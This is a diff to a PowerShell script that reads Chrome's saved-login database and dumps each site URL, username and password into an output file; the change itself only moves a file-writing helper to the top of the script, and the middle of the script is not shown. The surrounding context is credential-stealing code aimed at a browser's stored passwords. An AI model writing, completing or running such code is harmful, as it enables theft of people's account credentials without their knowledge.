@@ -1,3 +1,12 @@
+function AppendToFile {
+    param (
+        [string]$Data
+    )
+    Add-Content -Path $outputFilePath -Value $Data
+}
+
+############################################################################################################################################################
+
 $dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
 $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
 
@@ -121,15 +130,6 @@ while([WinSQLite3]::Step($stmt) -eq 100) {
         # Append data to the output file
         AppendToFile "$url  ||  $username  ||  $password`n"
     }
-}
-
-############################################################################################################################################################
-
-function AppendToFile {
-    param (
-        [string]$Data
-    )
-    Add-Content -Path $outputFilePath -Value $Data
 }
 
 ############################################################################################################################################################
